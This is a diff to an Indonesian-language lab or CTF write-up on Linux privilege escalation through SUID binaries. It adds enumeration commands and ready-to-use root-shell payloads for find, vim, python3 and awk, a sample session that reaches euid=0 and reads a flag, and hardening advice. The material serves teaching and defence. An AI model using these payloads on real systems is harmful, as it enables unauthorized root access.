@@ -17,15 +17,46 @@ find / -perm -4000 -type f 2>/dev/null
 # Mencari semua file yang memiliki SUID bit
 ```
 
-Contoh output:
+Verifikasi bit SUID (huruf `s` pada permission):
+
+```bash
+ls -la /usr/bin/find
+# Output: -rwsr-xr-x 1 root root ... /usr/bin/find
+#         ^ bit "s" menandakan SUID (berjalan sebagai root)
+```
+
+Tampilan **aman** (binary SUID wajar, tidak bisa diabuse):
 
 ```text
-/usr/bin/passwd
-/usr/bin/sudo
-/usr/bin/find
-/usr/bin/vim
-/usr/bin/python3
+/usr/bin/passwd          ← wajar, passwd memang butuh SUID
+/usr/bin/sudo            ← wajar, sudo memang butuh SUID
+/usr/bin/mount           ← wajar, mount butuh privilege
+/usr/bin/su              ← wajar, su memang butuh SUID
 ```
+
+Tampilan **rentan** (ada binary SUID yang bisa spawn shell):
+
+```text
+www-data@jobportal:~$ find / -perm -4000 -type f 2>/dev/null
+/usr/bin/passwd          ← wajar, passwd memang butuh SUID
+/usr/bin/sudo            ← wajar, sudo memang butuh SUID
+/usr/bin/mount           ← wajar, mount butuh privilege
+/usr/bin/find            ← RENTAN! find bisa -exec shell
+/usr/bin/vim             ← RENTAN! vim bisa shell escape
+/usr/bin/python3.11      ← RENTAN! interpreter bisa setuid(0)
+```
+
+Oneliner gabungan — cek SUID, sudo, dan capabilities **sekaligus** dalam satu command:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null; sudo -l; getcap -r / 2>/dev/null
+```
+
+- `find / -perm -4000 -type f 2>/dev/null` → enumerasi binary SUID (vektor file ini)
+- `sudo -l` → enumerasi permission sudoers → [Sudo.md](Sudo.md)
+- `getcap -r / 2>/dev/null` → enumerasi capabilities → [Capabilities.md](Capabilities.md)
+
+> **Catatan:** Separator `;` menjalankan ketiga command secara berurutan meskipun salah satunya gagal. Oneliner inilah yang dipakai pada PoC laporan (langkah eskalasi root) karena satu command langsung menyingkap ketiga vektor LPE sekaligus.
 
 ---
 
@@ -51,7 +82,35 @@ awk 'BEGIN{system("/bin/sh")}'        # SUID awk (mawk) /usr/bin/awk
 | `env` | `/bin/sh -p` | Preserve euid via env |
 | `bash` | `-p` | Mempertahankan euid |
 | `awk`/`mawk` | `system("/bin/sh")` | Menjalankan command |
-| `python3` | `os.system("/bin/sh")` | Spawn shell via Python |
+| `python3` | `os.setuid(0)` + `execl` | Spawn shell via Python |
+| `vim` | `:!/bin/sh -p` | Shell escape command-mode |
+
+Payload tambahan:
+
+```bash
+python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'   # SUID python3
+vim -c ':!/bin/sh -p'                                                 # SUID vim
+```
+
+---
+
+## Contoh Tampilan Eksploitasi (Root Shell)
+
+```text
+www-data@jobportal:~$ ls -la /usr/bin/find
+-rwsr-xr-x 1 root root 32016 Feb  8  2024 /usr/bin/find
+   ^ bit "s" = SUID, dimiliki root → binary ini berjalan sebagai root
+
+www-data@jobportal:~$ find . -name "x" -exec /bin/sh -p \;
+$ id
+uid=33(www-data) euid=0(root) gid=33(www-data) groups=33(www-data)
+$ whoami
+root
+$ cat /root/flag.txt
+FLAG{suid_binary_leads_to_root}
+```
+
+> **Capture:** Eksploitasi berhasil — `euid=0(root)` muncul karena flag `-p` mempertahankan effective UID dari SUID. Shell aktif sebagai root dan flag di `/root/flag.txt` berhasil dibaca.
 
 ---
 
@@ -83,6 +142,14 @@ Uji teknik yang sesuai
     ↓
 Verifikasi privilege dengan id
 ```
+
+---
+
+## Pengerasan Keamanan (Hardening)
+
+- **Audit Rutin SUID** Lakukan audit berkala pada seluruh binary ber-SUID (`find / -perm -4000`) dan hapus bit SUID yang tidak diperlukan (`chmod u-s <binary>`).
+- **Gunakan Allowlist** Batasi SUID hanya pada binary minimal esensial (`passwd`, `sudo`, `su`, `mount`).
+- **Hindari Binary Interpreting** Jangan berikan bit SUID pada interpreter (python, perl, ruby, node) maupun editor (vim, awk) karena semuanya bisa spawn shell.
 
 ---
 
